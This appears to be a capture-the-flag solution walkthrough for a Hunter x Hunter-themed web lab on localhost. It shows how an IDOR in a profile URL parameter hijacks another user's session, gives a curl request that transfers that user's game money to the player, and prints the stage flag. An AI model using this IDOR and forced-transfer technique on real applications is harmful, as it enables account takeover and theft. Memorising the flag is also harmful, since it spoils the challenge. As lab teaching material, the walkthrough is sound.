# Solution Walkthrough — HXH-C10 (Stage 2: Game Money & Account IDOR Hijacking)

## 📌 Challenge Overview
After logging in as `leorio_paradinight`, the player lands on the **Inner Command Dashboard (`dashboard.php`)**. Leorio currently has **0 Ⓙ (Jenny)** in his player pouch. The objective is to discover who holds funds, switch to their account via IDOR, transfer their funds to Leorio, switch back, and purchase the **Greed Island Secret Intelligence Dossier (1,000 Ⓙ)** from the Item Merchant.

---

## 🔍 Step-by-Step Exploitation

### Step 1: Reconnaissance & Target Discovery
1. After authentication, observe the **Dashboard** (`http://127.0.0.1:3003/dashboard.php`):
   - Active Hunter: `@leorio_paradinight` with `💰 IN-HAND: 0 Ⓙ`.
   - The **Menubar** provides navigation across portals: `Home`, `Profile`, `Bank`, `Shop`.
2. Review the **Sector 10 Hunter Registry & Wealth Leaderboard** table on the dashboard. Notice that all 15 candidates have massive **Declared Net Worth** estimates in the 58M - 98M range (e.g. 98,400,000 Ⓙ, 88,900,000 Ⓙ, 58,400,000 Ⓙ, etc.) making everyone appear wealthy on the public leaderboard. Milluki Zoldyck is subtly the lowest at 58,400,000 Ⓙ, but blends naturally with the rest of the roster.

---

### Step 2: Account Takeover via Profile IDOR
1. Open the profile page: `http://127.0.0.1:3003/profile.php`.
2. By default, it displays Leorio's profile with `0 Ⓙ` in physical cash.
3. Exploit the **Insecure Direct Object Reference (IDOR)** vulnerability by modifying the URL parameter (supports `?user=` or `?username=`):
   - `http://127.0.0.1:3003/profile.php?user=chrollo_lucilfer` (0 Ⓙ in physical pouch)
   - `http://127.0.0.1:3003/profile.php?user=hisoka_morow` (0 Ⓙ in physical pouch)
   - `http://127.0.0.1:3003/profile.php?user=gon_freecss` (0 Ⓙ in physical pouch)
4. When changing the URL to inspect Milluki Zoldyck (`profile.php?user=milluki_zoldyck` or `profile.php?username=milluki_zoldyck`):
5. **Complete Account Switch (User A ➔ User B)**:
   - The session completely transitions to **Milluki Zoldyck** with zero trace of the previous user.
   - The top navigation bar updates to: `LOGGED AS: @milluki_zoldyck` | `💰 IN-HAND: 10,000 Ⓙ`.
   - The profile details reveal that Milluki actually holds **10,000 Ⓙ** in liquid physical funds (while all other candidates only held fake/illiquid valuations).

---

### Step 3: P2P Fund Transfer as User B
> [!NOTE]
> **Why P2P Transfer is Mandatory**: If you visit `shop.php` while logged in as Milluki Zoldyck, the Greed Island merchant will reject direct procurement with a **`403 Forbidden / MERCHANT_BLACKLISTED`** error because the Zoldyck family is prohibited from buying official exam dossiers. You **must** transfer the money to an active Hunter candidate (`leorio_paradinight`).

1. Navigate to the Bank / P2P Trade Terminal (`http://127.0.0.1:3003/wallet.php`).
2. Notice the source account is automatically locked to `@milluki_zoldyck` with `10,000 Ⓙ` in hand.
3. In the transfer window:
   - **Destination Player (Recipient)**: Select `🩺 Leorio Paradinight (@leorio_paradinight)` from the candidate dropdown.
   - **Amount**: `10000` (or `1000`)
   - **Memo**: `Greed Island Fund Transfer`
4. Click **"SEND Ⓙ AS @milluki_zoldyck"** (or execute via `curl`):
   ```bash
   curl -X POST http://127.0.0.1:3003/api/transfer.php \
     -b "HXH_NEN_SESSION=<YOUR_SESSION_COOKIE>" \
     -d "from_user=milluki_zoldyck&to_user=leorio_paradinight&amount=10000&memo=Greed+Island+Fund+Transfer"
   ```
5. 10,000 Ⓙ is deducted from Milluki's account and credited to `leorio_paradinight`.

---

### Step 4: Switch Session Back to User A & Claim Flag
1. Use the IDOR URL parameter to switch back to Leorio's account:
   `http://127.0.0.1:3003/profile.php?username=leorio_paradinight`
2. The entire session is now back to Leorio with **10,000 Ⓙ** in hand (`LOGGED AS: @leorio_paradinight` | `💰 IN-HAND: 10,000 Ⓙ`).
3. Navigate to the Item Merchant (`http://127.0.0.1:3003/shop.php`).
4. Click **"BUY CLUE FOR 1,000 Ⓙ ⚡"**.
5. The server deducts 1,000 Ⓙ and reveals the confidential dossier with the Stage 2 flag:
   ```
   ========================================================================
     CONFIDENTIAL HUNTER INTEL // STAGE 2 CLEARED
   ========================================================================
   [+] EXPLOIT VERIFIED: P2P Game Money IDOR Hijacking Successful
   [+] TARGET DRAINED: Milluki Zoldyck (10,000 Ⓙ)
   [+] STAGE 2 FLAG: SSP{MILLUKI_BANK_IDOR_DRAINED_98A41}
   [+] GATEWAY STATUS: UNLOCKED (gateway.php is now accessible!)
   ------------------------------------------------------------------------
   [*] MISSION DIRECTIVE:
       Navigate to the Greed Island Gateway portal (gateway.php) and
       authenticate the Gateway Cipher with your Stage 2 Flag to energize
       the Smart Ring network and unlock the next stage!
   ========================================================================
   ```
6. **Discover & Access Unlocked Gateway Portal (`gateway.php`)**:
   - Prior to unlocking the clue, manually navigating to `http://127.0.0.1:3003/gateway.php` returns **HTTP 403 Forbidden**.
   - After purchasing the Stage 2 Clue, navigating to `http://127.0.0.1:3003/gateway.php` unlocks (**HTTP 200 OK**).
   - In `gateway.php`, enter the first flag (`SSP{MILLUKI_BANK_IDOR_DRAINED_98A41}`) into the **Gateway Portal Cipher Authentication** password field.
   - Upon submitting, the system displays **"WELL DONE, HUNTER!"**, issues the **`hunter_pouch`** cookie with the player's remaining 9,000 Ⓙ, and directs the player to Stage 3.
